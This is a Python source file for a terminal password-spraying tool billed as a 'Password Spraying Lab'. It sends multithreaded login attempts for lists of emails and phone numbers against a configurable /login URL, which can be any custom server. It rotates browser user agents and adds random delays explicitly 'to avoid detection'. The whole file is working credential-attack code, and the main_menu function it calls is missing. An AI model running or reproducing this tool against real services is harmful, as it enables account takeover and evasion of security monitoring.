import json
import time
import requests
import os
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ANSI Color Codes for Terminal
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

CONFIG_FILE = "config.json"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.PURPLE}High-Efficiency Password Spraying Lab v6.0{Colors.END}
{Colors.DIM}--------------------------------------------------{Colors.END}
    """
    print(banner)

def spray_task(target, password, url, config):
    headers = {}
    if config['advanced_settings']['random_user_agents']:
        headers['User-Agent'] = random.choice(USER_AGENTS)
    
    try:
        # Smart Delay to avoid detection
        delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
        time.sleep(delay)
        
        response = requests.post(f"{url}/login", json={"username": target, "password": password}, headers=headers, timeout=config['server_settings']['timeout'])
        
        if response.status_code == 200:
            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
            return True
        elif config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} (Failed){Colors.END}\n")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Connection Error on {target}: {e}{Colors.END}")
    return False

def run_high_efficiency_scan():
    config = load_config()
    clear_screen()
    show_banner()
    
    url = config['server_settings']['local_url'] if config['server_settings']['mode'] == "local" else config['server_settings']['custom_url']
    targets = config['targets']['emails'] + config['targets']['phones']
    passwords = config['passwords_to_test']
    threads = config['advanced_settings']['threads']
    
    if not targets or not passwords:
        print(f"{Colors.RED}[!] Targets or Passwords list is empty!{Colors.END}")
        time.sleep(2)
        return

    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{Colors.END}")
    print(f"{Colors.YELLOW}Threads: {Colors.CYAN}{threads}{Colors.END} | Smart Delay: {Colors.CYAN}Enabled{Colors.END}")
    print(f"{Colors.YELLOW}Initiating High-Efficiency Spray...{Colors.END}\n")

    # High Efficiency Multi-threading
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for pwd in passwords:
            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying all targets with password: {pwd}{Colors.END}")
            futures = [executor.submit(spray_task, target, pwd, url, config) for target in targets]
            for f in futures: f.result()
            print(f"{Colors.DIM}--- Finished spraying password: {pwd} ---{Colors.END}\n")
    
    input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")

def target_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Target Configuration ]{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Manage Emails")
        print(f"{Colors.GREEN}[2]{Colors.END} Manage Phone Numbers")
        print(f"{Colors.GREEN}[3]{Colors.END} Manage Passwords")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
        if choice == '1':
            print(f"\nCurrent Emails: {config['targets']['emails']}")
            new = input("Add new email (or 'clear' to reset): ")
            if new == 'clear': config['targets']['emails'] = []
            elif new: config['targets']['emails'].append(new)
            save_config(config)
        elif choice == '2':
            print(f"\nCurrent Phones: {config['targets']['phones']}")
            new = input("Add new phone (or 'clear' to reset): ")
            if new == 'clear': config['targets']['phones'] = []
            elif new: config['targets']['phones'].append(new)
            save_config(config)
        elif choice == '3':
            print(f"\nCurrent Passwords: {config['passwords_to_test']}")
            new = input("Add new password (or 'clear' to reset): ")
            if new == 'clear': config['passwords_to_test'] = []
            elif new: config['passwords_to_test'].append(new)
            save_config(config)
        elif choice == '0':
            break

def server_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Server Configuration ]{Colors.END}")
        print(f"Current Target: {Colors.CYAN}{config['server_settings']['local_url'] if config['server_settings']['mode'] == 'local' else config['server_settings']['custom_url']}{Colors.END}")
        print(f"Current Mode: {Colors.PURPLE}{config['server_settings']['mode'].upper()}{Colors.END}\n")
        print(f"{Colors.GREEN}[1]{Colors.END} Switch to LOCAL Server")
        print(f"{Colors.GREEN}[2]{Colors.END} Set CUSTOM Server URL")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
        if choice == '1':
            config['server_settings']['mode'] = "local"
            save_config(config)
        elif choice == '2':
            new_url = input("Enter custom URL: ")
            if new_url:
                config['server_settings']['custom_url'] = new_url
                config['server_settings']['mode'] = "custom"
                save_config(config)
        elif choice == '0':
            break

def advanced_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Advanced Settings ]{Colors.END}")
        print(f"1. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
        print(f"2. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
        print(f"3. Smart Delay: {Colors.CYAN}{config['advanced_settings']['smart_delay']}{Colors.END}")
        print(f"0. Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Advanced > {Colors.END}")
        if choice == '1':
            config['advanced_settings']['threads'] = int(input("Enter number of threads: "))
        elif choice == '2':
            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
        elif choice == '0':
            break
        save_config(config)

def start():
    while True:
        choice = main_menu()
        if choice == '1':
            run_high_efficiency_scan()
        elif choice == '2':
            target_config()
        elif choice == '3':
            server_config()
        elif choice == '4':
            advanced_config()
        elif choice == '0':
            sys.exit()

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        sys.exit()
